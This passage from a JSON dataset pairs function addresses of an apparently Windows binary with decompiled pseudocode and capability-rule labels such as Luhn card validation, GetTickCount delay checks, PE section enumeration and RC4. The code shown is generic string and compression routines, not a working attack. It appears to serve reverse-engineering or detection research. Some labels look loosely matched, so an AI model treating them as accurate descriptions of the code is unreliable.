        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.004232b0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar1 = fcn.004212d0(in_ECX, &var_ch, \"\\\\..\\\\\", *(arg_14h + 0x14));\n    uVar1 = fcn.0042e5b9(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00422b80(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042a75a(var_4ch);\n    return;\n}\n",
        "token_count": 256
    },
    "00423740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.00423740(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_24h = fcn.0042e5b9(&var_44h, 0x40, 0x448060, arg_1ch);\n    fcn.00422b80(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.0042a75a(var_44h);\n    return;\n}\n",
        "token_count": 212
    },
    "004237a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004237a0(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 8);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 154
    },
    "004237e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004237e0(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x10);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 156
    },
    "00423820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423820(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x14);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 155
    },
    "00423950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423950(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h_00 = 0x410;\n    iVar1 = (**0x463028)(0x410, 0, arg_ch);\n    if (iVar1 != 0) {\n        (**0x463064)(iVar1, 0, &var_108h, 0x104);\n        (**0x462ed0)(iVar1);\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch_00 = fcn.0042ad20(&var_108h);\n    fcn.004062a0(&var_108h, arg_ch_00);\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 271
    },
    "004239f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004239f0(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint32_t var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f0eb;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042a6e0(&var_114h, 0, 0x104, var_10h);\n    fcn.0042a6e0(&var_16ch, 0, 0x3c);\n    (**0x463038)(&var_114h, 0x4480a8);\n    (**0x463038)(&var_114h, \"ed block lengths\");\n    arg_ch = (**0x462fac)();\n    puVar1 = fcn.00423950(&var_130h, arg_ch);\n    var_4h = 0;\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    (**0x463038)(&var_114h, puVar1);\n    var_4h = 0xffffffff;\n    if (0xf < var_11ch) {\n        fcn.0042a679(var_130h);\n    }\n    puVar1 = &var_114h;\n    var_11ch = 0xf;\n    var_120h = 0;\n    var_130h = var_130h & 0xffffff00;\n    (**0x463038)(puVar1, \"invalid stored block lengths\");\n    var_158h = &var_114h;\n    var_16ch = 0x3c;\n    var_168h = 0;\n    var_164h = 0;\n    var_160h = 0x446e80;\n    var_15ch = 0x448064;\n    var_154h = 0;\n    var_150h = 0;\n    var_14ch = 0;\n    (**0x46309c)(&var_16ch);\n    fcn.0042a6e0(&var_16ch, 0, 0x3c);\n    fcn.0042a6e0(&var_114h, 0, 0x104);\n    (**0x462f9c)(0);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(puVar1);\n    return;\n}\n",
        "token_count": 690
    },
    "00423b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423b80(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint32_t arg_8h_01;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f138;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar1;\n    if (((*(in_ECX + 0x40) & 2) == 0) && (**(in_ECX + 0x24) != 0)) {\n        uVar2 = **(in_ECX + 0x24);\n        if (uVar2 <= *(in_ECX + 0x3c)) {\n            uVar2 = *(in_ECX + 0x3c);\n        }\n        arg_8h_01 = **(in_ECX + 0x14);\n        arg_8h_00 = uVar2 - arg_8h_01;\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch._1_3_ << 8;\n        fcn.004062a0(arg_8h_01, arg_8h_00);\n        var_4h = 0;\n    }\n    else {\n        if (((*(in_ECX + 0x40) & 4) != 0) || (**(in_ECX + 0x20) == 0)) {\n            var_34h = 0xf;\n            var_38h = 0;\n            var_48h = var_48h & 0xffffff00;\n            arg_8h_00 = &var_48h;\n            *(arg_8h + 0x14) = 0xf;\n            *(arg_8h + 0x10) = 0;\n            var_4h = 2;\n            *arg_8h = 0;\n            fcn.004063e0(arg_8h_00);\n            arg_8h_01 = var_48h;\n            uVar2 = var_34h;\n            goto joined_r0x00423c75;\n        }\n        arg_8h_01 = **(in_ECX + 0x10);\n        arg_8h_00 = (**(in_ECX + 0x30) + **(in_ECX + 0x20)) - arg_8h_01;\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch._1_3_ << 8;\n        fcn.004062a0(arg_8h_01, arg_8h_00);\n        var_4h = 1;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063e0(&var_2ch);\n    uVar2 = var_18h;\njoined_r0x00423c75:\n    if (0xf < uVar2) {\n        fcn.0042a679(arg_8h_01, arg_8h_00, uVar1);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 902
    },
    "00423cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423cb0(uchar *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    iVar1 = arg_ch[4];\n    puVar2 = arg_ch;\n    if (7 < arg_ch[5]) {\n        puVar2 = *arg_ch;\n    }\n    uVar3 = (**0x462fd0)(0, 0, puVar2, iVar1 + 1, 0, 0, 0, 0);\n    arg_8h_00 = fcn.00429c39(uVar3);\n    if (7 < arg_ch[5]) {\n        arg_ch = *arg_ch;\n    }\n    (**0x462fd0)(0, 0, arg_ch, iVar1 + 1, arg_8h_00, uVar3, 0, 0);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    uVar3 = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, uVar3);\n    fcn.0042bc28(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 324
    },
    "00423d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00423d50(ushort *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_4h;\n    \n    iVar1 = arg_ch[4];\n    puVar2 = arg_ch;\n    if (0xf < arg_ch[5]) {\n        puVar2 = *arg_ch;\n    }\n    uVar3 = (**0x462eac)(0, 0, puVar2, iVar1 + 1, 0, 0);\n    arg_8h_00 = fcn.00429c39(-(uVar3 * 2 >> 0x20 != 0) | uVar3 * 2);\n    if (0xf < arg_ch[5]) {\n        arg_ch = *arg_ch;\n    }\n    (**0x462eac)(0, 0, arg_ch, iVar1 + 1, arg_8h_00, uVar3);\n    *(arg_8h + 10) = 7;\n    *(arg_8h + 8) = 0;\n    *arg_8h = 0;\n    arg_ch_00 = fcn.0042e2d3(arg_8h_00);\n    fcn.0041f740(arg_8h_00, arg_ch_00);\n    fcn.0042bc28(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 342
    },
    "00423f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423f80(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00423b80(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 47
    },
    "00423fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423fb0(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00423b80(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 47
    },
    "00423fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423fe0(uchar *arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint32_t in_stack_ffffff04;\n    int32_t var_dch;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c4h;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint32_t var_70h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f216;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    var_34h = arg_8h;\n    *arg_8h = 0;\n    var_dch = 0x44801c;\n    var_cch = 0x448024;\n    var_4h = 1;\n    var_30h = 3;\n    var_7ch = 0x4477c0;\n    var_d4h = 0;\n    var_d0h = 0;\n    fcn.00418570(var_10h);\n    var_44h = &var_c4h;\n    var_40h = 0;\n    var_3ch._0_1_ = fcn.00419580(0x20);\n    if (var_44h == NULL) {\n        in_stack_ffffff04 = var_70h | 4;\n        fcn.00418440(in_stack_ffffff04, 0);\n    }\n    *(&var_cch + *(var_cch + 4)) = 0x447f78;\n    *(&var_dch + *(var_dch + 4)) = 0x447f80;\n    var_4h = 6;\n    *(&var_dch + *(var_dch + 4)) = 0x447ffc;\n    fcn.00418ec0();\n    var_c4h = 0x447f8c;\n    var_88h = 0;\n    var_84h = 0;\n    var_4h = 8;\n    fcn.004220e0(arg_ch);\n    arg_8h_00 = fcn.00423f80(&var_2ch);\n    var_4h = CONCAT31(var_4h._1_3_, 9);\n    fcn.004063e0(arg_8h_00);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.004215e0();\n    var_7ch = 0x447298;\n    fcn.0042a309(&var_7ch);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(in_stack_ffffff04);\n    return;\n}\n",
        "token_count": 791
    },
    "00424180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424180(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint uVar2;\n    uint uVar3;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_58h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f26f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = 1;\n    uVar2 = 2;\n    var_4h = 0;\n    var_10h = 0;\n    fcn.00422e10(2, 1);\n    var_4h = 1;\n    fcn.004222d0(arg_ch, uVar2, uVar3, uVar1);\n    fcn.00423fb0(arg_8h);\n    var_10h = 1;\n    *(&var_a8h + *(var_a8h + 4)) = 0x447fcc;\n    var_4h = 2;\n    var_a4h = 0x447f8c;\n    fcn.00420dd0();\n    fcn.00418650();\n    *(&var_a8h + *(var_a8h + 4)) = 0x447f78;\n    var_4h = var_4h & 0xffffff00;\n    var_58h = 0x447298;\n    fcn.0042a309(&var_58h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 404
    },
    "00424280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00424280(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    int32_t var_d8h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_a0h;\n    uint var_70h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f2b4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    var_10h = 1;\n    fcn.00423e00(arg_ch, 0x20, 0x40, 1);\n    var_4h = 1;\n    fcn.00421560(0, 0, 2);\n    if ((*(&var_cch + *(var_d8h + 4)) & 6) == 0) {\n        (**(**(&var_a0h + *(var_d8h + 4)) + 0x28))(&var_28h, 0, 0, 1, 1);\n    }\n    else {\n        var_28h = *0x448780;\n        var_24h = *0x448784;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n    }\n    uVar1 = var_20h + var_28h;\n    if (arg_8h[4] < uVar1) {\n        fcn.0040bc50(uVar1 - arg_8h[4], 0);\n    }\n    else {\n        fcn.00405ac0(uVar1, 0xffffffff);\n    }\n    fcn.00421560(0, 0, 0);\n    puVar2 = arg_8h;\n    if (0xf < arg_8h[5]) {\n        puVar2 = *arg_8h;\n    }\n    fcn.004224c0(puVar2, arg_8h[4], 0);\n    iVar3 = fcn.0041a310();\n    if (iVar3 == 0) {\n        uVar1 = *(&var_cch + *(var_d8h + 4));\n        arg_8h_00 = uVar1 | 2;\n        if (*(&var_a0h + *(var_d8h + 4)) == 0) {\n            arg_8h_00 = uVar1 | 6;\n        }\n        fcn.00418440(arg_8h_00, 0);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.0041cc80();\n    var_70h = 0x447298;\n    fcn.0042a309(&var_70h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 767
    },
    "00424400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424400(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f302;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = in_ECX[1];\n    if ((arg_8h < uVar1) && (uVar2 = *in_ECX,  uVar2 <= arg_8h)) {\n        if (uVar1 == in_ECX[2]) {\n            fcn.0041d960(1);\n        }\n        arg_8h = *in_ECX + ((arg_8h - uVar2) / 0x1c) * 0x1c;\n        puVar3 = in_ECX[1];\n        var_4h = 0;\n        if (puVar3 == NULL) goto code_r0x004244cb;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    else {\n        if (uVar1 == in_ECX[2]) {\n            fcn.0041d960(1);\n        }\n        puVar3 = in_ECX[1];\n        var_4h = 1;\n        if (puVar3 == NULL) goto code_r0x004244cb;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    fcn.00412860(arg_8h, 0, 0xffffffff);\ncode_r0x004244cb:\n    in_ECX[1] = in_ECX[1] + 0x1c;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 477
    },
    "004244f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004244f0(uint *arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    int32_t iVar4;\n    uint arg_ch_01;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *arg_ch_02;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_26ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f35a;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_ch_02 = &arg_ch;\n    arg_8h_00 = &var_48h;\n    var_4h = 1;\n    var_10h = uVar1;\n    puVar2 = fcn.00423d50(arg_8h_00, arg_ch_02);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    uVar3 = (**0x440044)(puVar2, &var_298h, arg_8h_00, arg_ch_02, uVar1);\n    if (7 < var_34h) {\n        fcn.0042a679(var_48h);\n    }\n    var_34h = 7;\n    var_38h = 0;\n    var_48h = var_48h & 0xffff0000;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    var_18h = 7;\n    var_1ch = 0;\n    var_2ch = var_2ch._2_2_ << 0x10;\n    arg_ch_00 = fcn.0042e2d3(&var_26ch);\n    fcn.0041f740(&var_26ch, arg_ch_00);\n    var_4h._0_1_ = 2;\n    fcn.00424400(&var_2ch);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    iVar4 = (**0x440040)(uVar3, &var_298h);\n    while (iVar4 != 0) {\n        var_18h = 7;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffff0000;\n        arg_ch_01 = fcn.0042e2d3(&var_26ch);\n        fcn.0041f740(&var_26ch, arg_ch_01);\n        var_4h._0_1_ = 3;\n        fcn.00424400(&var_2ch);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (7 < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        iVar4 = (**0x440040)(uVar3, &var_298h);\n    }\n    if (0xf < arg_20h) {\n        fcn.0042a679(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_ch_00);\n    return;\n}\n",
        "token_count": 931
    },
    "00425770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425770(int32_t arg_8h)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = arg_8h + 0x14;\n    iVar2 = 0x11e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = arg_8h + 0x908;\n    iVar2 = 0x1e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = arg_8h + 0xef4;\n    iVar2 = 0x13;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *(arg_8h + 0x414) = 1;\n    *(arg_8h + 0x1af40) = 0;\n    *(arg_8h + 0x1af3c) = 0;\n    *(arg_8h + 0x1af34) = 0;\n    *(arg_8h + 0x1af30) = 0;\n    *(arg_8h + 0x1af2c) = 0;\n    *(arg_8h + 0x1af38) = 0x100;\n    return;\n}\n",
        "token_count": 372
    },
    "00425800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425800(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    bool bVar10;\n    \n    iVar9 = *(arg_8h + 0x18f8);\n    iVar5 = *(arg_8h + 0x1004 + arg_10h * 4);\n    iVar8 = arg_10h * 2;\n    bVar10 = SBORROW4(iVar8, iVar9);\n    iVar7 = iVar8 - iVar9;\n    if (iVar9 < iVar8) {\n        *(arg_8h + 0x1004 + arg_10h * 4) = iVar5;\n        return;\n    }\n    while( true ) {\n        iVar9 = iVar8;\n        if (bVar10 != iVar7 < 0) {\n            iVar7 = *(arg_8h + 0x1008 + iVar8 * 4);\n            uVar3 = *(arg_ch + iVar7 * 4);\n            uVar4 = *(arg_ch + *(arg_8h + 0x1004 + iVar8 * 4) * 4);\n            if ((uVar3 < uVar4) ||\n               ((uVar3 == uVar4 &&\n                (uVar2 = *(iVar7 + 0x1900 + arg_8h),  puVar1 = *(arg_8h + 0x1004 + iVar8 * 4) + 0x1900 + arg_8h, \n                uVar2 < *puVar1 || uVar2 == *puVar1)))) {\n                iVar9 = iVar8 + 1;\n            }\n        }\n        iVar7 = *(arg_8h + 0x1004 + iVar9 * 4);\n        uVar3 = *(arg_ch + iVar5 * 4);\n        uVar4 = *(arg_ch + iVar7 * 4);\n        if ((uVar3 < uVar4) ||\n           ((uVar3 == uVar4 &&\n            (uVar2 = *(iVar5 + 0x1900 + arg_8h),  puVar1 = iVar7 + 0x1900 + arg_8h,  uVar2 < *puVar1 || uVar2 == *puVar1\n            )))) break;\n        *(arg_8h + 0x1004 + arg_10h * 4) = iVar7;\n        iVar6 = *(arg_8h + 0x18f8);\n        iVar8 = iVar9 * 2;\n        bVar10 = SBORROW4(iVar8, iVar6);\n        iVar7 = iVar8 - iVar6;\n        arg_10h = iVar9;\n        if (iVar6 < iVar8) {\n            *(arg_8h + 0x1004 + iVar9 * 4) = iVar5;\n            return;\n        }\n    }\n    *(arg_8h + 0x1004 + arg_10h * 4) = iVar5;\n    return;\n}\n",
        "token_count": 729
    },
    "00425e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425e40(uint *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = arg_8h[0x6bd7];\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h;\n    iVar3 = arg_10h + iVar2;\n    arg_8h[0x6bd7] = iVar3;\n    arg_8h[0x6bd6] = arg_8h[0x6bd6] | arg_ch << (iVar2 & 0x1f);\n    if (0x10 < iVar3) {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = *(arg_8h + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = *(arg_8h + 0x1af59);\n        arg_8h[0x6bd7] = arg_8h[0x6bd7] + -0x10;\n        *puVar1 = *puVar1 + 1;\n        arg_8h[0x6bd6] = arg_ch >> (arg_10h - arg_8h[0x6bd7] & 0x1fU);\n    }\n    return;\n}\n",
        "token_count": 419
    },
    "004263b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004263b0(int32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(3, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(4, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 2) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 3) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x2c) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x2d) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | 